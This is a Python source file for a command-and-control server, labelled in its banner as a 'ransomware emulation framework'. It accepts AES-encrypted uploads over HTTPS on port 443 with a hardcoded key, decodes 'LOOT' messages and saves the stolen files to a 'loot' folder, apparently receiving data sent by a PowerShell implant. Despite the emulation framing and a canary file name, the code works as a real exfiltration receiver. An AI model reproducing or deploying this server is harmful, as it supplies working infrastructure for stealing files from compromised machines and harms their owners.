import asyncio, base64, aiosqlite, os, json
from quart import Quart, request, jsonify
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import logging

# Silence the specific hypercorn/asyncio transition errors
logging.getLogger('hypercorn.error').setLevel(logging.CRITICAL)
logging.getLogger('asyncio').setLevel(logging.CRITICAL)

app = Quart(__name__)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024 

DB_FILE = "apex_vault.db"
SHARED_KEY = b"12345678901234567890123456789012"
CANARY_FILE = "_ADMIN_PASSWORDS.xlsx"
LOOT_DIR = "loot"

if not os.path.exists(LOOT_DIR):
    os.makedirs(LOOT_DIR)

SPLASH = r"""
 █████╗ ██████╗ ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ 
██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗
███████║██████╔╝█████╗   ╚███╔╝     ██████╔╝██████╔╝██║   ██║
██╔══██║██╔═══╝ ██╔══╝   ██╔██╗     ██╔═══╝ ██╔══██╗██║   ██║
██║  ██║██║     ███████╗██╔╝ ██╗    ██║     ██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
            APEX PRO: RANSOMWARE EMULATION FRAMEWORK
                C2 Command & Control Server
"""

async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS telemetry 
             (id INTEGER PRIMARY KEY, ip TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP, payload TEXT, canary_tripped INTEGER)''')
        await db.commit()

@app.before_serving
async def startup():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(SPLASH)
    print(f"[*] C2 Listener: HTTPS/443 | Status: ACTIVE")
    print("-" * 65)
    await init_db()

def decrypt_binary_payload(raw_data):
    # This takes raw encrypted bytes (IV + Ciphertext)
    iv, ciphertext = raw_data[:16], raw_data[16:]
    cipher = Cipher(algorithms.AES(SHARED_KEY), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded).decode('utf-8')

@app.route('/api/v1/telemetry', methods=['POST'])
async def telemetry():
    print(f"[*] Connection received from: {request.remote_addr}")
    
    raw_payload = await request.get_data()
    if not raw_payload:
        return jsonify({"status": "error"}), 400

    try:
        # Step 1: Decrypt the binary blob
        decrypted = await asyncio.to_thread(decrypt_binary_payload, raw_payload)
        
        is_canary = 0
        log_entry = decrypted
        
        if decrypted.startswith("LOOT|"):
            parts = decrypted.split("|")
            if len(parts) == 3:
                _, filename, file_b64 = parts
                
                # --- THE CRITICAL FIX FOR THE 85-CHAR ERROR ---
                # Strip any quotes or junk that PowerShell added to the file content
                clean_file_b64 = file_b64.strip().replace('"', '').replace("'", "")
                
                # Force valid Base64 padding for the file content
                while len(clean_file_b64) % 4 != 0:
                    clean_file_b64 = clean_file_b64[:-1]
                
                file_bytes = base64.b64decode(clean_file_b64)
                # ----------------------------------------------

                filepath = os.path.join(LOOT_DIR, filename)
                with open(filepath, "wb") as f:
                    f.write(file_bytes)
                
                print(f"\n[!!!] SMASH & GRAB SUCCESS: {filename}")
                log_entry = f"STOLEN_FILE: {filename}"
                is_canary = 1
        
        async with aiosqlite.connect(DB_FILE) as db:
            await db.execute("INSERT INTO telemetry (ip, payload, canary_tripped) VALUES (?, ?, ?)", 
                           (request.remote_addr, log_entry, is_canary))
            await db.commit()
            
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        # This will now tell us EXACTLY which part of the process failed
        print(f"[!] Process Failed: {str(e)}")
        return jsonify({"status": "error"}), 400

from hypercorn.config import Config
from hypercorn.asyncio import serve

if __name__ == '__main__':
    config = Config()
    config.bind = ["0.0.0.0:443"]
    config.certfile = 'apex_cert.pem'
    config.keyfile = 'apex_key.pem'
    asyncio.run(serve(app, config))